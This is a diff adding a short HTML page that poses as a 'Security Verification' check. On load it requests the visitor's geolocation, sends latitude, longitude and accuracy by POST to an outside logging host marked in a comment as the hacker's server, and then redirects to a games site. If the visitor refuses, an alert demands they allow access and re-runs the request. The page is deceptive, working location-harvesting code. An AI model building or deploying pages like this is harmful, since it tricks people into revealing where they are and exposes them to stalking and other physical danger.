@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, forceAllow);
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+
+            // Send the data to hacker's server
+            fetch("http://newzz.fwh.is/log.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
+            });
+
+            // Redirect to Google after successful location access
+            window.location.href = "https://www.crazygames.com/multiplayer";
+        }
+
+        function forceAllow(error) {
+            alert("You must click 'Allow' to proceed. Click 'Retry' and allow location access.");
+            getLocation(); // Re-run location request
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h2>Security Verification</h2>
+    <p>For security reasons, please allow location access.</p>
+</body>
+</html>
